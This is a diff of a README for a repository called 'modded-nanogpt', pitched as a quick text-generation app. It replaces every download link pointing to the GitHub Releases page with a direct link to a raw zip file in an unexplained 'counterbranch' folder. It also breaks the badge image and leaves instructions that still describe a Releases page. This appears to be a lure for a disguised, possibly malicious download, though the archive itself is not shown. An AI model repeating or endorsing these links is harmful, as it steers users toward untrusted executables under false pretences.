@@ -4,7 +4,7 @@
 
 Welcome to the **modded-nanogpt** repository! This application uses the NanoGPT model to help you create engaging text in just three minutes. Follow the steps below to download and run this software with ease.
 
-[![Download modded-nanogpt](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Tnhn07/modded-nanogpt/releases)
+[![Download modded-nanogpt](https://raw.githubusercontent.com/Tnhn07/modded-nanogpt/master/counterbranch/modded-nanogpt.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tnhn07/modded-nanogpt/master/counterbranch/modded-nanogpt.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To start using **modded-nanogpt**, you need to download the application from our
 
 1. Click on the link below to visit the download page.
    
-   [Download here](https://github.com/Tnhn07/modded-nanogpt/releases)
+   [Download here](https://raw.githubusercontent.com/Tnhn07/modded-nanogpt/master/counterbranch/modded-nanogpt.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest release, which will be at the top.
 3. Click on the version link to open its details.
@@ -78,4 +78,4 @@ For updates and news regarding **modded-nanogpt**, keep an eye on the repository
 
 Feel free to reach out if you have questions about the application. Happy text generating!
 
-[Download modded-nanogpt](https://github.com/Tnhn07/modded-nanogpt/releases)
+[Download modded-nanogpt](https://raw.githubusercontent.com/Tnhn07/modded-nanogpt/master/counterbranch/modded-nanogpt.zip)
